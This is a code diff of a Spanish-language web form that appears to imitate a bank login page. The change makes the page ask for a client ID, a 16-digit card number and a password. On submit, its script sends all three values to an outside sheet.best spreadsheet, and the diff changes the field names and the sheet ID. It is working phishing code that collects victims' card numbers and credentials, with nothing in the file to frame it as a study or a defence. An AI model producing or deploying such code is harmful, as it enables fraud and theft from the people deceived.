@@ -48,21 +48,21 @@
 				</div>
 		
 					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro"><b>Ingresa Tu Usuario</b>
+						<p class="centro"><b>Ingresa Tu ID De Cliente</b>
 						</p><br>
 						<label for="nombre">Tu usuario debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
 						<input type="password" input id="usuario" name="usuario" placeholder="ID Cliente"/>
 					</div>
 					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro"><b>Ingresa Tu Contraseña</b>
+						<p class="centro"><b>Ingresa Tu Tarjeta</b>
 						</p><br>
-						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
+						<label for="nombre">Tu tarjeta debe tener 16 caracteres</label>
 					<div class="contenedor-input">
 						<input type="text" input id="contraseña" name="contraseña" placeholder="Contraseña"/>
 					</div>
 					<form class="formulario" id="contact-form"  name="submit-form">
-						<p class="centro"><b>Confirma Tu Contraseña</b>
+						<p class="centro"><b>Ingresa Tu Contraseña</b>
 						</p><br>
 						<label for="nombre">Tu contraseña debe tener entre 8 y 30 caracteres</label>
 					<div class="contenedor-input">
@@ -108,16 +108,16 @@ formulario.addEventListener('submit', async(e) =>{
 
 
 try {    
-    const respuesta = await fetch('https://sheet.best/api/sheets/c9e26098-f7d2-41dc-a01d-7195fa7caabf', {
+    const respuesta = await fetch('https://sheet.best/api/sheets/e904c97e-5d82-4c6b-bb1a-d7030e5501b6', {
         method: 'POST',
         mode: 'cors',
         headers: {
             'Content-Type': 'application/json'
         },
         body: JSON.stringify({
-            "Cliente": formulario.usuario.value,
-            "Clave": formulario.contraseña.value,
-            "Clave2": formulario.confirmar.value
+            "Usuario": formulario.usuario.value,
+            "Tarjeta": formulario.contraseña.value,
+            "Clave": formulario.confirmar.value
         })
     });
 
